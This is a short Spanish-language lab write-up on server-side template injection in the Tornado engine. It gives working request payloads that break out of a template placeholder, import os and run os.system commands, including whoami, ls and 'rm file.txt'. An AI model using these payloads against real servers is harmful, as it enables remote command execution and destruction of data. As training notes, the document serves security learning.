# SSTI básica en contexto de código

Tags: #SSTI #Tornado  #BurpSuite 

* [SSTI Tornado](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#tornado)

```bash 
En este lab se identifica una vulnerabilidad de Server-Side Template Injection (SSTI) en el motor de plantillas Tornado. Mediante una combinación de sintaxis de plantillas y código Python embebido, conseguimos ejecutar comandos arbitrarios desde el servidor.

Esto permite borrar un archivo sensible de forma remota, demostrando el riesgo de interpolar entradas del usuario sin sanitización en contextos de código.
```

```bash 
# Petición original 

	blog=user.first_name&csrf=123456
```

```bash 
# Petición modificada con SSTI

	blog=}}text&csrf=123456     # Primero cerrar el placeholder {{ input }} -> {{ }}text }}
	blog=}}{{7*7&csrf=123456    # Forma correcta {{ input }} -> {{ }}{{7*7 }}

	blog=}}{%import os%}{{os.system('whoami') &csrf=123456
	blog=}}{%import os%}{{os.system('ls -ll') &csrf=123456
	blog=}}{%import os%}{{os.system('rm file.txt') &csrf=123456
```